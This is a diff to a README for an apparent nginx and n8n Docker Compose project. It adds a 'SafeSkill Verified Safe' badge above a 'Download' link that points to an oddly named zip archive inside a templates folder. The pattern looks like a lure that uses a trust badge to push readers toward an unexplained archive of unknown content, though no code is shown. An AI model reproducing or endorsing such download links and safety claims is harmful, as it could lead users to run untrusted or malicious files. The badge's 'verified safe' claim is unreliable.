@@ -1,5 +1,7 @@
 # 🛠️ full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose - Easily Install n8n With Docker
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/lingga1997-full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose)
+
 ![Download](https://raw.githubusercontent.com/lingga1997/full-stack-proxy-nginx-n8n-for-everyone-with-docker-compose/main/proxy/templates/proxy-for-nginx-compose-stack-everyone-n-with-full-docker-odophone.zip)
 
 ## 📦 Overview
